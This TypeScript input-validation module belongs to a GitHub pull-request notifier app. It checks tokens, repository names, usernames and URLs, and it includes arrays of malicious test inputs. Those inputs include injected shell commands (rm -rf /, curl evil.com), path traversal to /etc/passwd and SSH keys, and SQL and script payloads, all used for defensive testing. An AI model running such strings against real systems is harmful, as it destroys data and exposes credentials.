/**
 * InputValidator.ts
 *
 * Secure input validation module for GitHub PR Notifier App
 *
 * This module provides comprehensive validation for all user inputs to prevent:
 * - Command injection attacks
 * - Path traversal exploits
 * - SQL injection patterns
 * - URL injection
 * - Null byte injection
 * - Unicode/homograph attacks
 * - Malformed data causing application crashes
 *
 * All validation functions are pure (no side effects) and return boolean values.
 * Performance: O(n) where n is input length, with safeguards against ReDoS attacks.
 *
 * Created: 2025-10-22
 * Security-First Implementation
 */

/**
 * Validates GitHub Personal Access Token format
 *
 * GitHub tokens have specific prefixes and length requirements:
 * - ghp_: Personal Access Token (classic)
 * - gho_: OAuth access token
 * - ghs_: GitHub App installation access token
 *
 * Format: ^gh[ops]_[A-Za-z0-9]{36,255}$
 * Minimum length: 40 characters (prefix + 36 chars)
 * Maximum length: 300 characters (reasonable upper bound)
 *
 * Security: Rejects empty strings, whitespace-only, malformed tokens,
 * and tokens with special characters that could indicate injection attempts
 *
 * @param token - The GitHub token string to validate
 * @returns true if token matches valid GitHub token format, false otherwise
 *
 * @example
 * validateGitHubToken('ghp_1234567890abcdefghijklmnopqrstuvwxyzAB') // true
 * validateGitHubToken('invalid_token') // false
 * validateGitHubToken('ghp_$(whoami)') // false - command injection attempt
 */
export function validateGitHubToken(token: string): boolean {
  // Guard: Reject null, undefined, or non-string inputs
  if (!token || typeof token !== 'string') {
    return false;
  }

  // Guard: Reject empty or whitespace-only strings
  const trimmed = token.trim();
  if (trimmed.length === 0 || trimmed !== token) {
    return false; // Also reject tokens with leading/trailing whitespace
  }

  // Guard: Check length constraints (GitHub tokens are at least 40 chars)
  if (token.length < 40 || token.length > 300) {
    return false;
  }

  // Guard: Must start with valid GitHub token prefix
  if (!token.startsWith('ghp_') && !token.startsWith('gho_') && !token.startsWith('ghs_')) {
    return false;
  }

  // Security: Reject tokens with dangerous characters that could indicate injection
  // GitHub tokens only contain alphanumeric characters and underscores
  const dangerousChars = /[^A-Za-z0-9_]/;
  if (dangerousChars.test(token)) {
    return false;
  }

  // Security: Reject null bytes (path traversal attempts)
  if (token.includes('\0')) {
    return false;
  }

  // Main validation: GitHub token format
  // Format: gh[pos]_ followed by at least 36 alphanumeric characters
  // Using a simple regex to avoid catastrophic backtracking (ReDoS)
  const tokenPattern = /^gh[ops]_[A-Za-z0-9]{36,255}$/;

  return tokenPattern.test(token);
}

/**
 * Validates GitHub repository name in owner/repo format
 *
 * GitHub repository names must follow these rules:
 * - Format: exactly "owner/repo" (one slash)
 * - Owner: 1-39 characters, alphanumeric + hyphens + underscores
 * - Repo: 1-100 characters, alphanumeric + dots + hyphens + underscores
 *
 * Security Critical: This function rejects ALL potentially dangerous patterns:
 * - Path traversal: ../, ./, //
 * - URL schemes: http://, https://, file://
 * - Shell metacharacters: ;, &, |, $, `, <, >, \n, \r
 * - Control characters and null bytes
 * - Leading/trailing whitespace
 *
 * @param repo - The repository string to validate (format: owner/repo)
 * @returns true if repo matches valid GitHub repository format, false otherwise
 *
 * @example
 * validateRepository('facebook/react') // true
 * validateRepository('my-org/my.repo') // true
 * validateRepository('../../etc/passwd') // false - path traversal
 * validateRepository('owner/repo; rm -rf /') // false - command injection
 * validateRepository('file:///etc/passwd') // false - URL scheme
 */
export function validateRepository(repo: string): boolean {
  // Guard: Reject null, undefined, or non-string inputs
  if (!repo || typeof repo !== 'string') {
    return false;
  }

  // Guard: Reject empty or whitespace-only strings
  const trimmed = repo.trim();
  if (trimmed.length === 0 || trimmed !== repo) {
    return false; // Also reject repos with leading/trailing whitespace
  }

  // Guard: Length check (owner max 39 + slash + repo max 100 = 140)
  if (repo.length < 3 || repo.length > 140) {
    return false;
  }

  // Security: Reject path traversal patterns
  if (repo.includes('../') || repo.includes('./') || repo.includes('//')) {
    return false;
  }

  // Security: Reject URL schemes (prevent URL injection)
  const urlSchemes = ['http://', 'https://', 'file://', 'ftp://', 'data:', 'javascript:'];
  if (urlSchemes.some(scheme => repo.toLowerCase().includes(scheme))) {
    return false;
  }

  // Security: Reject shell metacharacters (prevent command injection)
  const shellMetachars = /[;&|$`<>\n\r\t\\]/;
  if (shellMetachars.test(repo)) {
    return false;
  }

  // Security: Reject control characters and null bytes
  // eslint-disable-next-line no-control-regex
  const controlChars = /[\x00-\x1F\x7F]/;
  if (controlChars.test(repo)) {
    return false;
  }

  // Security: Reject SQL injection patterns
  if (repo.includes("'") || repo.includes('"') || repo.includes('--') || repo.includes('/*') || repo.includes('*/')) {
    return false;
  }

  // Main validation: Must have exactly one slash
  const parts = repo.split('/');
  if (parts.length !== 2) {
    return false;
  }

  const [owner, repoName] = parts;

  // Validate owner component
  // GitHub usernames/orgs: 1-39 chars, alphanumeric + hyphens + underscores
  // Cannot start or end with hyphen
  if (owner.length === 0 || owner.length > 39) {
    return false;
  }

  // Owner pattern: alphanumeric, hyphens, underscores only
  const ownerPattern = /^[a-zA-Z0-9_-]+$/;
  if (!ownerPattern.test(owner)) {
    return false;
  }

  // Owner cannot start or end with hyphen (GitHub rule)
  if (owner.startsWith('-') || owner.endsWith('-')) {
    return false;
  }

  // Validate repo name component
  // GitHub repos: 1-100 chars, alphanumeric + dots + hyphens + underscores
  if (repoName.length === 0 || repoName.length > 100) {
    return false;
  }

  // Repo pattern: alphanumeric, dots, hyphens, underscores only
  const repoPattern = /^[a-zA-Z0-9._-]+$/;
  if (!repoPattern.test(repoName)) {
    return false;
  }

  // Additional security: Reject repos that are just dots (e.g., ".", "..", "...")
  if (/^\.+$/.test(repoName)) {
    return false;
  }

  return true;
}

/**
 * Validates GitHub username format
 *
 * GitHub usernames must follow these rules:
 * - Length: 1-39 characters (GitHub's limit)
 * - Characters: alphanumeric + hyphens only
 * - Cannot start or end with hyphen
 * - Cannot contain consecutive hyphens
 * - Case insensitive
 *
 * Security: Rejects special characters, control characters, null bytes,
 * and patterns that could indicate injection attempts
 *
 * @param username - The GitHub username to validate
 * @returns true if username matches valid GitHub username format, false otherwise
 *
 * @example
 * validateUsername('octocat') // true
 * validateUsername('github-user') // true
 * validateUsername('user123') // true
 * validateUsername('-invalid') // false - starts with hyphen
 * validateUsername('user; curl evil.com') // false - command injection attempt
 */
export function validateUsername(username: string): boolean {
  // Guard: Reject null, undefined, or non-string inputs
  if (!username || typeof username !== 'string') {
    return false;
  }

  // Guard: Reject empty or whitespace-only strings
  const trimmed = username.trim();
  if (trimmed.length === 0 || trimmed !== username) {
    return false; // Also reject usernames with leading/trailing whitespace
  }

  // Guard: Length check (GitHub usernames are 1-39 characters)
  if (username.length < 1 || username.length > 39) {
    return false;
  }

  // Security: Reject special characters except hyphen
  const validChars = /^[a-zA-Z0-9-]+$/;
  if (!validChars.test(username)) {
    return false;
  }

  // Security: Reject null bytes
  if (username.includes('\0')) {
    return false;
  }

  // Security: Reject control characters
  // eslint-disable-next-line no-control-regex
  const controlChars = /[\x00-\x1F\x7F]/;
  if (controlChars.test(username)) {
    return false;
  }

  // GitHub rule: Cannot start with hyphen
  if (username.startsWith('-')) {
    return false;
  }

  // GitHub rule: Cannot end with hyphen
  if (username.endsWith('-')) {
    return false;
  }

  // GitHub rule: Cannot contain consecutive hyphens
  if (username.includes('--')) {
    return false;
  }

  // Security: Additional check for Unicode homograph attacks
  // GitHub usernames are ASCII-only, so reject any non-ASCII characters
  // eslint-disable-next-line no-control-regex
  const asciiOnly = /^[\x20-\x7E]+$/;
  if (!asciiOnly.test(username)) {
    return false;
  }

  return true;
}

/**
 * Validates GitHub PR URL format (additional security layer)
 *
 * Ensures URLs opened with shell.openExternal are legitimate GitHub PR links
 *
 * @param url - The URL to validate
 * @returns true if URL is a valid GitHub URL, false otherwise
 *
 * @example
 * validateGitHubURL('https://github.com/facebook/react/pull/123') // true
 * validateGitHubURL('file:///etc/passwd') // false
 * validateGitHubURL('javascript:alert(1)') // false
 */
export function validateGitHubURL(url: string): boolean {
  // Guard: Reject null, undefined, or non-string inputs
  if (!url || typeof url !== 'string') {
    return false;
  }

  // Guard: Reject empty or whitespace-only strings
  const trimmed = url.trim();
  if (trimmed.length === 0) {
    return false;
  }

  // Security: Must be HTTPS GitHub URL only
  if (!url.startsWith('https://github.com/')) {
    return false;
  }

  // Security: Reject URLs with suspicious patterns
  const dangerousPatterns = [
    '../',
    './',
    '//',
    'javascript:',
    'data:',
    'file:',
    'vbscript:',
    'about:',
    '\0',
  ];

  for (const pattern of dangerousPatterns) {
    if (url.includes(pattern) && pattern !== '//') {
      return false;
    }
  }

  // Check for double-slash in hostname (protocol slashes are OK)
  const afterProtocol = url.substring('https://'.length);
  if (afterProtocol.includes('//')) {
    return false;
  }

  // Parse URL to validate structure
  try {
    const parsedUrl = new URL(url);

    // Must be github.com domain only (no subdomains except www)
    if (parsedUrl.hostname !== 'github.com' && parsedUrl.hostname !== 'www.github.com') {
      return false;
    }

    // Must use HTTPS protocol
    if (parsedUrl.protocol !== 'https:') {
      return false;
    }

    // Path should match GitHub URL patterns
    // Valid patterns: /owner/repo, /owner/repo/pull/123, /owner/repo/issues/456
    const pathPattern = /^\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9._-]+(\/[a-z]+\/[0-9]+)?$/;
    if (!pathPattern.test(parsedUrl.pathname)) {
      return false;
    }

  } catch (error) {
    // Invalid URL format
    return false;
  }

  return true;
}

/**
 * Validates check interval value (minutes)
 *
 * @param interval - The interval in minutes
 * @returns true if interval is valid, false otherwise
 */
export function validateCheckInterval(interval: number): boolean {
  // Must be a positive integer between 1 and 1440 (24 hours)
  return Number.isInteger(interval) && interval >= 1 && interval <= 1440;
}

/**
 * Test suite data structure for validation testing
 * Used in unit tests to verify all malicious inputs are rejected
 */
export const MALICIOUS_TEST_CASES = {
  repositories: [
    '../../etc/passwd',
    '../../../.ssh/id_rsa',
    'owner/repo; rm -rf /',
    'owner/repo && curl evil.com',
    'owner/repo | cat /etc/passwd',
    'owner/repo; $(whoami)',
    'owner/repo`whoami`',
    'file:///etc/passwd',
    'http://evil.com/repo',
    'https://evil.com/repo',
    "owner/repo' OR '1'='1",
    'owner/repo--',
    'owner/repo/*',
    'owner/repo\0',
    'owner/rеpo', // Cyrillic 'е'
    'owner//repo',
    '/owner/repo',
    'owner/repo/',
    'owner/repo/extra',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
  ],
  tokens: [
    '',
    '   ',
    'not_a_valid_token',
    'ghp_tooshort',
    'ghp_ABC123$(whoami)',
    'ghp_ABC123;rm -rf /',
    'ghp_ABC123`whoami`',
    'ghp_ABC123\0',
    'invalid_prefix_1234567890abcdefghijklmnopqrstuvwxyz',
  ],
  usernames: [
    '',
    '   ',
    'user; curl evil.com',
    'user && whoami',
    'user | cat /etc/passwd',
    '../../../etc',
    'user\0name',
    'usеr', // Cyrillic 'е'
    '-startwithhyphen',
    'user-',
    'user--name',
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', // 40 chars - too long
    'user@example.com',
    'user.name',
    'user name',
  ],
};

/**
 * Valid test cases for verification
 */
export const VALID_TEST_CASES = {
  repositories: [
    'facebook/react',
    'microsoft/vscode',
    'my-org/my.repo',
    'user_name/repo_name',
    'a/b', // Minimum valid length
  ],
  tokens: [
    'ghp_1234567890abcdefghijklmnopqrstuvwxyzAB',
    'gho_1234567890abcdefghijklmnopqrstuvwxyzAB',
    'ghs_1234567890abcdefghijklmnopqrstuvwxyzAB',
  ],
  usernames: [
    'octocat',
    'github-user',
    'user123',
    'A',
    'a-b-c',
    'user-123',
  ],
};
